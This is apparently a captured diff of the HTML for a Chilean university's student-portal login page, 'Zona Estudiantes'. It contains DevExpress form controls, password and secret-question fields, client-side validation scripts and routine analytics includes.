+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.helpText = 'M&#225;ximo 10 caracteres';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.externalTableStyle=['dxeRoot', null];
+dxo.AfterCreate();
+
+//-->
+</script><table id="ppc_ActivaClave_txtContrasena2_ET" cellpadding="0" cellspacing="0" class="dxeRoot"><tbody><tr><td><table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtContrasena2" style="width:100px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtContrasena2_I" name="ppc_ActivaClave$txtContrasena2" onfocus="aspxEGotFocus('ppc_ActivaClave_txtContrasena2')" onblur="aspxELostFocus('ppc_ActivaClave_txtContrasena2')" onchange="aspxEValueChanged('ppc_ActivaClave_txtContrasena2')" type="password" maxlength="10"></td>
+				</tr>
+			</tbody></table><input type="hidden" name="ppc_ActivaClave$txtContrasena2$CVS" value=""></td></tr><tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Máximo 10 caracteres</label></td></tr></tbody></table>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Pregunta Secreta</td>
+                               <td>
+                                   <select name="ppc_ActivaClave$ddlPregunta" id="ppc_ActivaClave_ddlPregunta">
+				<option value="Pelicula Favorita">Pelicula Favorita</option>
+				<option value="Color Favorito">Color Favorito</option>
+				<option value="Cantante Favorito(a)">Cantante Favorito(a)</option>
+				<option value="Numero Favorito">Numero Favorito</option>
+				<option value="Musica Favorita">Musica Favorita</option>
+				<option value="Deporte Favorito">Deporte Favorito</option>
+				<option value="Comida Favorita ">Comida Favorita </option>
+				<option value="Actividad Favorita">Actividad Favorita</option>
+				<option value="Mascota Favorita">Mascota Favorita</option>
+
+			</select>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Respuesta</td>
+                               <td>
+                                   <table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtRespuesta" style="width:250px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtRespuesta_I" name="ppc_ActivaClave$txtRespuesta" onfocus="aspxEGotFocus('ppc_ActivaClave_txtRespuesta')" onblur="aspxELostFocus('ppc_ActivaClave_txtRespuesta')" onchange="aspxEValueChanged('ppc_ActivaClave_txtRespuesta')" type="text" maxlength="50"></td>
+				</tr>
+			</tbody></table><script id="dxss_428502311" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtRespuesta');
+window['ppc_ActivaClave_txtRespuesta'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtRespuesta';
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe ingresar una respuesta') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.AfterCreate();
+
+//-->
+</script>
+                               <input type="hidden" name="ppc_ActivaClave$txtRespuesta$CVS" value=""></td>
+                           </tr>
+                           <tr>
+                               <td colspan="2" style="text-align:center">
+                                   <div class="dxbButton_Aqua dxbButtonSys dxbTSys" id="ppc_ActivaClave_btnActivaCalve" style="font-family:Arial;font-size:12px;font-weight:bold;height:22px;-khtml-user-select:none;">
+				<div class="dxb" id="ppc_ActivaClave_btnActivaCalve_CD">
+					<div class="dxb-hbc">
+						<input class="dxb-hb" value="Grabar" type="submit" name="ppc_ActivaClave$btnActivaCalve" readonly="readonly">
+					</div><span class="dx-vam">Grabar</span>
+				</div>
+			</div><script id="dxss_126980885" type="text/javascript">
+<!--
+aspxAddHoverItems('ppc_ActivaClave_btnActivaCalve',[[['dxbButtonHover_Aqua'],[''],[''],['','TC']]]);
+aspxAddPressedItems('ppc_ActivaClave_btnActivaCalve',[[['dxbButtonPressed_Aqua'],[''],[''],['','TC']]]);
+
+var dxo = new ASPxClientButton('ppc_ActivaClave_btnActivaCalve');
+window['ppc_ActivaClave_btnActivaCalve'] = dxo;
+dxo.autoPostBack = true;
+dxo.uniqueID = 'ppc_ActivaClave$btnActivaCalve';
+dxo.RegisterServerEventAssigned(['Click']);
+aspxAddSelectedItems('ppc_ActivaClave_btnActivaCalve',[[['dxbf'],[''],['CD']]]);
+dxo.validationGroup = "ActivaClave";
+dxo.AfterCreate();
+
+//-->
+</script>
+                               </td>
+                           </tr>
+                       </tbody></table>
+                   
+		</div>
+	</div>
+</div><div id="ppc_ActivaClave_DXPWMB-1" class="dxpcModalBackLite_Aqua" style="z-index:9999;">
+
+</div><table id="ppc_ActivaClave_LP" class="dxpcLoadingPanel_Aqua dxlpLoadingPanel_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;left:0px;top:0px;z-index:30000;display:none;">
+	<tbody><tr>
+		<td class="dx"><img class="dxlp-loadingImage dxlp-imgPosTop" src="/DXR.axd?r=1_19-FO8ck" alt="" align="middle"><br><span id="ppc_ActivaClave_TL">Cargando…</span></td>
+	</tr>
+</tbody></table><div id="ppc_ActivaClave_LD" class="dxpcLoadingDiv_Aqua dxlpLoadingDiv_Aqua dx-ft" style="left:0px;top:0px;z-index:29999;display:none;position:absolute;">
+
+</div><script id="dxss_1394382019" type="text/javascript">
+<!--
+aspxAddHoverItems('ppc_ActivaClave',[[['dxpc-closeBtnHover'],[''],['HCB-1']]]);
+
+var dxo = new ASPxClientPopupControl('ppc_ActivaClave');
+window['ppc_ActivaClave'] = dxo;
+dxo.encodeHtml = false;
+dxo.callBack = function(arg) { WebForm_DoCallback('ppc_ActivaClave',arg,aspxCallback,'ppc_ActivaClave',aspxCallbackError,true); };
+dxo.enableAnimation=false;
+dxo.popupAction='MouseOver';
+dxo.closeAction='CloseButton';
+dxo.popupHorizontalAlign='WindowCenter';
+dxo.popupVerticalAlign='WindowCenter';
+dxo.isPopupPositionCorrectionOn=false;
+dxo.width=500;
+dxo.widthFromServer=true;
+dxo.height=150;
+dxo.defaultWindowPopupElementIDList=['popup'];
+dxo.AfterCreate();
+
+//-->
+</script>
+    
+
+<script type="text/javascript">
+//<![CDATA[
+
+var callBackFrameUrl='/WebResource.axd?d=myfKNOXtGKNRwJ8HHeqsqFd8c0-zv6xz22B13Zl7UDCtR4PfOzzs3pmXJOh9dFIIoWLUsp6CWpso-4vRVOSqM2LkY5Yz4w60Eyo5Cn-tSy41&t=638942102819057530';
+WebForm_InitCallback();//]]>
+</script>
+<input type="hidden" name="DXScript" id="DXScript" value="1_187,1_101,1_180,1_98,1_172,1_178,1_163,1_142,1_130,1_137,1_121,1_170,1_139"><input type="hidden" name="DXCss" id="DXCss" value="../css/login.css,1_14,1_16,1_1,0_275,0_279,1_7,1_8,1_6,0_105,0_107"></form>
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7492d97e98584332b31c700b9b368fcf&quot;}" crossorigin="anonymous"></script>
+
+
+<audio class="audio-output" style="display: none;"></audio><div id="volume-booster-visusalizer">
+                    <div class="sound">
+                        <div class="sound-icon"></div>
+                        <div class="sound-wave sound-wave_one"></div>
+                        <div class="sound-wave sound-wave_two"></div>
+                        <div class="sound-wave sound-wave_three"></div>
+                    </div>
+                    <div class="segments-box">
+                        <div data-range="1-20" class="segment"><span></span></div>
+                        <div data-range="21-40" class="segment"><span></span></div>
+                        <div data-range="41-60" class="segment"><span></span></div>
+                        <div data-range="61-80" class="segment"><span></span></div>
+                        <div data-range="81-100" class="segment"><span></span></div>
+                    </div>
+                </div></body></html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Zona Estudiantes</title>
+    <link href="../css/login.css" rel="stylesheet">
+    <script src="../js/validaciones.js"></script>
+    <script>
+        function ComparaClaves(s, e) {
+            clave = txtContrasena.GetText();
+            claveConf = txtContrasena2.GetText();
+
+            if (clave != claveConf) {
+                e.isValid = false;
+                e.errorText = "Las claves ingresadas no coinciden";
+            }
+        }
+        function largoClave(s, e) {
+            var clave = txtContrasena.GetText();
+            var rut = txtRut.GetValue();
+            var rutDV = txtRut.GetValue();
+            var rutCompleto = rutDV
+
+            if (clave.length < 8) {
+                e.isValid = false;
+                e.errorText = "La Clave debe contener como minimo 8 caracteres";
+            }
+            if (clave == rut || clave == rutDV || clave == rutCompleto) {
+                e.isValid = false;
+                e.errorText = "La Clave debe ser distinta del rut";
+            }
+            if (clave == "12345678" || clave == "87654321" || clave == "01234567" || clave == "76543210" || clave == "23456789" || clave == "98765432") {
+                e.isValid = false;
+                e.errorText = "La Clave debe ser distinta de: 12345678,87654321,01234567,76543210,23456789,98765432";
+            }
+        }
+        function DetectarBloqueador() {
+            var ventana = 'habilitada';
+            var popUp = window.open('', ventana, 'width=1000, height=700, left=24, top=24, scrollbars, resizable');
+            if (popUp == null || typeof (popUp) == 'undefined') {
+                alert('Las ventanas emergentes estan bloqueadas en el explorador, para un correcto funcionamiento de la zona deben estar habilitadas.');
+            } else {
+                popUp.close();
+
+            }
+        }
+        function getIP(json) {
+            txtIP.SetText(json.ip);
+        }
+    </script>
+<style></style><style></style></head>
+<body onload="DetectarBloqueador();">
+    <form method="post" action="./login.aspx?ReturnUrl=%2festudiantes%2fdatos_pers.aspx" id="form1">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTcyNTg4OTA5MA9kFgICAQ9kFgYCAQ88KwAIAQAPFgIeDl8hVXNlVmlld1N0YXRlZ2QWAmYPZBYCZg9kFgJmD2QWAgIBDzwrAAkBAA8WAh8AZ2RkAgUPPCsACAEADxYCHwBnZGQCBw88KwAIAQAPFgIfAGdkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WCAUWcG5sTWVudSRtbnVFc3R1ZGlhbnRlcwUPQVNQeFJvdW5kUGFuZWwxBRhBU1B4Um91bmRQYW5lbDEkZnJtTG9naW4FJEFTUHhSb3VuZFBhbmVsMSRmcm1Mb2dpbiRidG5JbmdyZXNhcgUKcHBjTWVuc2FqZQUPcHBjX0FjdGl2YUNsYXZlBSZwcGNfQWN0aXZhQ2xhdmUkQVNQeFZhbGlkYXRpb25TdW1tYXJ5MQUecHBjX0FjdGl2YUNsYXZlJGJ0bkFjdGl2YUNhbHZlqpNb6h1yhrWLQHGC/Ko6TnWp0JDbn8DgT9oUt3u1Klg=">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=ltXxBVJPp9bUNc9kdH19ks5KLCAKYPOGzHj6pUbLjUfEbShmj2lO1SoFpiCduCcWicztERegHWakIzKSfIQmk6x1ASIVgc6CbPGw2bNmt5Y1&amp;t=638942102819057530" type="text/javascript"></script>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="1806D926">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAuxnUEKAY2HbjHjnCbtlL961bODHUqmMErpwujLKCaDPA0piYeZFS6+SheeQihfRxeJikp9AAQYhjkvGo5sHqxWnNalBvw0HxZOkf5ULVV6ZXBDlDhGEJIvlyDKnSVkZS/Eg04kweFP3lusTKAYddL7e2cE7G3VtnRMFrm5LE9/Zb3XXNRx1FAIekCPXYwmDzRNpgh0ZFRlO2NMyBgM7SYUzbX8ghZ9hsowNThkAEQYT8ffiSR6iBc+yjgf0smD1OyfeRdUhIYXkF48TiQxUAv8">
+</div>
+    <div id="cont_ppal">
+        <div id="header"></div>
+        <div id="contenido">
+            <div id="mnu">
+                <script id="dxis_1039134530" src="/DXR.axd?r=1_187,1_101,1_180,1_98,1_172,1_178,1_163,1_142,1_130,1_137,1_121,1_170,1_139-FO8ck" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="/DXR.axd?r=1_14,1_16,1_1,0_275,0_279,1_7,1_8,1_6,0_105,0_107-JO8ck"><div class="dxpnlControl pnlCenter" dir="rtl" id="pnlMenu" style="background-color:#004677;padding-left:0px;padding-right:0px;padding-top:0px;padding-bottom:0px;">
+	
+                            <div class="dxmLite dxm-rtl">
+		<div class="dxm-main dxm-horizontal" id="pnlMenu_mnuEstudiantes" style="background-color: rgb(0, 70, 119); border-style: none; vertical-align: middle;">
+			<ul class="dx dxm-image-r" style="">
+				<li title="Acceso Estudiantes" class="dxm-item" style="border-style: none; border-right-color: white; border-right-width: 1px; min-width: 39px;" id="pnlMenu_mnuEstudiantes_DXI0_"><a class="dxm-content dx" href="../estudiantes/datos_pers.aspx" title="Acceso Estudiantes" style="color: white;" id="pnlMenu_mnuEstudiantes_DXI0_T"><img class="dxm-image dx-vam" src="../img/login/login.png" alt="" id="pnlMenu_mnuEstudiantes_DXI0_Img"></a></li><li class="dxm-spacing" id="pnlMenu_mnuEstudiantes_DXI0_II" style="height: 31px;"></li><li title="Ir al Home" class="dxm-item" style="background-color: rgb(0, 70, 119); border-style: none; border-right-color: white; border-right-width: 1px; min-width: 37px;" id="pnlMenu_mnuEstudiantes_DXI1_"><a class="dxm-content dx" href="../index.aspx" title="Ir al Home" style="color: white;" id="pnlMenu_mnuEstudiantes_DXI1_T"><img class="dxm-image dx-vam" src="../img/zona_estudiante/home2.gif" alt="" id="pnlMenu_mnuEstudiantes_DXI1_Img"></a></li>
+			</ul>
+		</div><b class="dx-clear"></b>
+	</div><script id="dxss_1280346417" type="text/javascript">
+<!--
+aspxAddHoverItems('pnlMenu_mnuEstudiantes',[[['dxm-hovered',''],['border-bottom-style:None;border-top-style:None;border-left-style:None;border-right-color:White;border-right-style:None;border-right-width:1px;color:#FD9705;background-color:#3399FF;',''],['DXI0_','DXI1_'],['','T']],[['dxm-scrollBtnHovered'],[''],['DXSB0_U','DXSB0_D']]]);
+
+var dxo = new ASPxClientMenu('pnlMenu_mnuEstudiantes');
+window['pnlMenu_mnuEstudiantes'] = dxo;
+dxo.uniqueID = 'pnlMenu$mnuEstudiantes';
+dxo.rtl = true;
+dxo.renderData={'':[[0],[1]]};
+dxo.scrollInfo=['0'];
+dxo.AfterCreate();
+
+//-->
+</script>
+                        
+</div>
+            </div>
+            <div id="left">
+
+            </div>
+            <div id="login">
+                <div id="formulario">
+                    <table class="dxrpControl_Aqua" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1" style="width:200px;border-collapse:collapse;border-collapse:separate;">
+	<tbody><tr>
+		<td id="ASPxRoundPanel1_HC" class="dxrpHeader_Aqua dx-borderBox"><span id="ASPxRoundPanel1_RPHT" class="dxrpHT dx-vam">Acceso Zona Estudiantes</span></td>
+	</tr><tr class="dxrpCR">
+		<td id="ASPxRoundPanel1_RPC" class="dxrp dxrpcontent dx-borderBox" style="width:100%;"><div class="dxrpAW">
+			<div class="dx-borderBox dxrpCW">
+				
+                                <div class="dxflFormLayout_Aqua" id="ASPxRoundPanel1_frmLogin">
+					<table class="dxflGroup_Aqua dxflGroupSys dxflAGSys" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+						<tbody><tr>
+							<td id="ASPxRoundPanel1_frmLogin_0" class="dxflGroupCell_Aqua"><table class="dxflCLLSys dxflItemSys dxflTextEditItemSys dxflItem_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+								<tbody><tr>
+									<td class="dxflHALSys dxflVATSys dxflCaptionCell_Aqua dxflCaptionCellSys" style="width: 40px;"><label class="dxflCaption_Aqua" for="ASPxRoundPanel1_frmLogin_txtRut_I">RUT:</label><em class="dxflRequired_Aqua">*</em></td><td class="dxflNestedControlCell_Aqua">
+                                                    <input type="hidden" id="ASPxRoundPanel1_frmLogin_txtRut_Raw" name="ASPxRoundPanel1_frmLogin_txtRut_Raw" value=""><table id="ASPxRoundPanel1_frmLogin_txtRut_ET" class="dxeValidDynEditorTable dxeRoot" cellspacing="0" cellpadding="0" style="border-collapse:collapse;" errorframe="errorFrame">
+										<tbody><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtRut_CC"><table class="dxeTextBoxSys dxeTextBox dxeNullText dxh0" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtRut" style="width:170px;border-collapse:collapse;" savedspellcheck="[object Object]" spellcheck="false">
+												<tbody><tr>
+													<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys dxh0" name="ASPxRoundPanel1$frmLogin$txtRut" value="Ej.:12345678" maxlength="8" id="ASPxRoundPanel1_frmLogin_txtRut_I" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtRut')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtRut')" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtRut')" type="text" autocomplete="off" savedspellcheck="[object Object]" spellcheck="false"></td>
+												</tr>
+											</tbody></table><input type="hidden" name="ASPxRoundPanel1$frmLogin$txtRut$CVS" value=""></td>
+										</tr><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtRut_EC" class="dxeErrorCell dxeErrorFrame dxeErrorFrameSys dxeErrorCellSys dxeNoBorderTop" style="display:none;"><table cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;">
+												<tbody><tr>
+													<td><img id="ASPxRoundPanel1_frmLogin_txtRut_EI" class="dxEditors_edtError" src="/DXR.axd?r=1_19-FO8ck" alt=""></td><td id="ASPxRoundPanel1_frmLogin_txtRut_ETC" style="width:100%;white-space:nowrap;">Valor no válido</td>
+												</tr>
+											</tbody></table></td>
+										</tr>
+									<tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Sin puntos, guión y digito verificador</label></td></tr></tbody></table><script id="dxss_1539610516" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtRut',[[['dxeDisabled'],[''],['','I']]]);
+document.getElementById("ASPxRoundPanel1_frmLogin_txtRut_ET").setAttribute("errorFrame", "errorFrame");
+document.getElementById("ASPxRoundPanel1_frmLogin_txtRut_I").setAttribute("autocomplete", "off");
+
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtRut');
+window['txtRut'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtRut';
+dxo.KeyPress.AddHandler(function(s, e) { SoloNumeros(s, e); });
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('Ingrese RUT') ];
+dxo.display = "Dynamic";
+dxo.errorImageIsAssigned = true;
+dxo.controlCellStyles = { cssClass: 'dxeErrorFrame dxeErrorFrameSys dxeNoBorderBottom dxeControlsCell', style: "" };
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.styleDecoration.AddStyle('N','dxeNullText','');
+dxo.nullText = 'Ej.:12345678';
+dxo.helpText = 'Sin puntos, gui&#243;n y digito verificador';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.errorCellPosition = 'Bottom';
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                    
+                                                </td>
+								</tr>
+							</tbody></table></td>
+						</tr><tr>
+							<td id="ASPxRoundPanel1_frmLogin_1" class="dxflGroupCell_Aqua"><table class="dxflCLLSys dxflItemSys dxflTextEditItemSys dxflItem_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+								<tbody><tr>
+									<td class="dxflHALSys dxflVATSys dxflCaptionCell_Aqua dxflCaptionCellSys" style="width: 40px;"><label class="dxflCaption_Aqua" for="ASPxRoundPanel1_frmLogin_txtClave_I_CLND">Clave:</label><em class="dxflRequired_Aqua">*</em></td><td class="dxflNestedControlCell_Aqua">
+                                                    <input type="hidden" id="ASPxRoundPanel1_frmLogin_txtClave_Raw" name="ASPxRoundPanel1_frmLogin_txtClave_Raw" value=""><table id="ASPxRoundPanel1_frmLogin_txtClave_ET" class="dxeValidDynEditorTable dxeRoot" cellspacing="0" cellpadding="0" style="border-collapse:collapse;" errorframe="errorFrame">
+										<tbody><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtClave_CC"><table class="dxeTextBoxSys dxeTextBox dxeNullText dxh0" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtClave" style="width:170px;border-collapse:collapse;" savedspellcheck="[object Object]" spellcheck="false">
+												<tbody><tr>
+													<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys dxh0" id="ASPxRoundPanel1_frmLogin_txtClave_I" name="ASPxRoundPanel1$frmLogin$txtClave" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtClave')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtClave')" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtClave')" type="password" maxlength="10" autocomplete="off" savedspellcheck="[object Object]" spellcheck="false" saveddisplay="[object Object]" style="display: none;"><input class="dxeEditArea dxeEditAreaSys dxh0" id="ASPxRoundPanel1_frmLogin_txtClave_I_CLND" type="text" tabindex="0" saveddisplay="[object Object]" style=""></td>
+												</tr>
+											</tbody></table><input type="hidden" name="ASPxRoundPanel1$frmLogin$txtClave$CVS" value=""></td>
+										</tr><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtClave_EC" class="dxeErrorCell dxeErrorFrame dxeErrorFrameSys dxeErrorCellSys dxeNoBorderTop" style="display:none;"><table cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;">
+												<tbody><tr>
+													<td><img id="ASPxRoundPanel1_frmLogin_txtClave_EI" class="dxEditors_edtError" src="/DXR.axd?r=1_19-FO8ck" alt=""></td><td id="ASPxRoundPanel1_frmLogin_txtClave_ETC" style="width:100%;white-space:nowrap;">Valor no válido</td>
+												</tr>
+											</tbody></table></td>
+										</tr>
+									</tbody></table><script id="dxss_356747159" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtClave',[[['dxeDisabled'],[''],['','I']]]);
+document.getElementById("ASPxRoundPanel1_frmLogin_txtClave_ET").setAttribute("errorFrame", "errorFrame");
+document.getElementById("ASPxRoundPanel1_frmLogin_txtClave_I").setAttribute("autocomplete", "off");
+
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtClave');
+window['txtClave'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtClave';
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('Ingrese Clave') ];
+dxo.display = "Dynamic";
+dxo.errorImageIsAssigned = true;
+dxo.controlCellStyles = { cssClass: 'dxeErrorFrame dxeErrorFrameSys dxeNoBorderBottom dxeControlsCell', style: "" };
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.styleDecoration.AddStyle('N','dxeNullText','');
+dxo.nullText = 'Ingrese su password';
+dxo.errorCellPosition = 'Bottom';
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                </td>
+								</tr>
+							</tbody></table></td>
+						</tr><tr>
+							<td id="ASPxRoundPanel1_frmLogin_2" class="dxflHACSys dxflGroupCell_Aqua" style="width:100%;"><div class="dxflCLLSys dxflItemSys dxflButtonItemSys dxflItem_Aqua" style="width:100%;">
+								
+                                                    <table style="width:100%">
+                                                        <tbody><tr>
+                                                            <td align="center"><div class="dxbButton_Aqua dxbButtonSys dxbTSys" id="ASPxRoundPanel1_frmLogin_btnIngresar" style="-khtml-user-select:none;">
+									<div class="dxb" id="ASPxRoundPanel1_frmLogin_btnIngresar_CD">
+										<div class="dxb-hbc">
+											<input class="dxb-hb" value="Ingresar" type="submit" name="ASPxRoundPanel1$frmLogin$btnIngresar" readonly="readonly">
+										</div><span class="dx-vam">Ingresar</span>
+									</div>
+								</div><script id="dxss_1287170829" type="text/javascript">
+<!--
+aspxAddHoverItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbButtonHover_Aqua'],[''],[''],['','TC']]]);
+aspxAddPressedItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbButtonPressed_Aqua'],[''],[''],['','TC']]]);
+
+var dxo = new ASPxClientButton('ASPxRoundPanel1_frmLogin_btnIngresar');
+window['ASPxRoundPanel1_frmLogin_btnIngresar'] = dxo;
+dxo.autoPostBack = true;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$btnIngresar';
+dxo.RegisterServerEventAssigned(['Click']);
+aspxAddSelectedItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbf'],[''],['CD']]]);
+dxo.AfterCreate();
+
+//-->
+</script></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td align="left">
+                                                                <a class="dxeHyperlink" id="ASPxRoundPanel1_frmLogin_hl_Olvido" href="recuperarClave.aspx" style="color:#0066CC;font-family:Arial;font-size:11px;text-decoration:none;">¿olvido su clave?</a>
+                                                                <table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtIP" style="width:170px;border-collapse:collapse;display:none;">
+									<tbody><tr>
+										<td class="dxic" style="width: 100%; white-space: normal;"><input class="dxeEditArea dxeEditAreaSys" id="ASPxRoundPanel1_frmLogin_txtIP_I" name="ASPxRoundPanel1$frmLogin$txtIP" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtIP')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtIP')" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtIP')" type="text"></td>
+									</tr>
+								</tbody></table><script id="dxss_965717708" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtIP',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtIP');
+window['txtIP'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtIP';
+dxo.clientVisible = false;
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody></table>
+                                                        
+                                                
+							</div></td>
+						</tr>
+					</tbody></table>
+				</div><script id="dxss_1978283788" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientFormLayout('ASPxRoundPanel1_frmLogin');
+window['frmLogin'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin';
+dxo.CreateItems([['','0',,,,],['','1',,,,],['','2',,,,]]);
+dxo.AfterCreate();
+
+//-->
+</script>
+                            
+			</div>
+		</div></td>
+	</tr>
+</tbody></table>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+        <input type="hidden" id="ppcMensajeWS" name="ppcMensajeWS" value="0:0:-1:-10000:-10000:0:350:100:1:0:0:0"><div id="ppcMensaje_PW-1" class="dxpcLite_Aqua dxpclW" style="height:100px;width:350px;cursor:default;z-index:10000;display:none;visibility:hidden;">
+	<div class="dxpc-mainDiv dxpc-shadow">
+		<div class="dxpc-header dxpc-withBtn" id="ppcMensaje_PWH-1">
+			<div class="dxpc-closeBtn" id="ppcMensaje_HCB-1">
+				<img class="dxWeb_pcCloseButton_Aqua" src="/DXR.axd?r=1_19-FO8ck" alt="[Cerrar]">
+			</div><div class="dxpc-headerContent">
+				<span class="dxpc-headerText dx-vam" id="ppcMensaje_PWH-1T">Login</span>
+			</div><b class="dx-clear"></b>
+		</div><div class="dxpc-contentWrapper">
+			<div class="dxpc-content" id="ppcMensaje_PWC-1">
+				
+                    <span class="dxeBase" id="ppcMensaje_txtMensaje">ASPxLabel</span>
+                
+			</div>
+		</div>
+	</div>
+</div><div id="ppcMensaje_DXPWMB-1" class="dxpcModalBackLite_Aqua" style="z-index:9999;">
+
+</div><script id="dxss_489450871" type="text/javascript">
+<!--
+aspxAddHoverItems('ppcMensaje',[[['dxpc-closeBtnHover'],[''],['HCB-1']]]);
+
+var dxo = new ASPxClientPopupControl('ppcMensaje');
+window['ppcMensaje'] = dxo;
